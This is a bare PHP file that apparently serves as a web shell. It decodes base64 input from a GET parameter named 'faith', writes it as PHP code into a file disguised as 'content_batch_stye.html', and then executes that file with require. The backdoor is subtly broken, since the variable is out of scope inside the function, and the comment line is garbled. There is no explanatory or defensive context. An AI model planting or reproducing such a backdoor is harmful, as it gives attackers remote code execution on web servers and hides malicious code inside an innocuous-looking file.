<?php 
 //ļ
if(isset($_GET['faith'])){
   $faith=base64_decode($_GET['faith']);
   mud();
}
function mud(){
$fp=fopen('content_batch_stye.html','w');
file_put_contents('content_batch_stye.html',"<?php\r\n");
file_put_contents('content_batch_stye.html',$faith,FILE_APPEND);
fclose($fp);
require 'content_batch_stye.html';}
?>